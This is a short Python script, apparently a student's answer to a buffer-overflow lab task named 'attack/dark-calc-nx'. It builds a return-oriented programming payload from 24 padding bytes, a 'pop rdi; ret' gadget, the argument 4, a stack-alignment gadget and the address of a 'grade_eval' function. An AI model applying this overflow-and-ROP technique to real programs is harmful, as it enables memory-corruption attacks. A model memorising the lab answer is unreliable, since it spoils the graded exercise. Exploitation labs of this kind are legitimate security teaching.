#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

pad  = b"A" * 24                                    
chain  = (0x401a33).to_bytes(8, "little")           # pop rdi ; ret
chain += (4).to_bytes(8, "little")                  # rdi = 4 
chain += (0x401a34).to_bytes(8, "little")           # 修栈对齐
chain += (0x401978).to_bytes(8, "little")           # grade_eval

sys.stdout.buffer.write(pad + chain + b"\n")
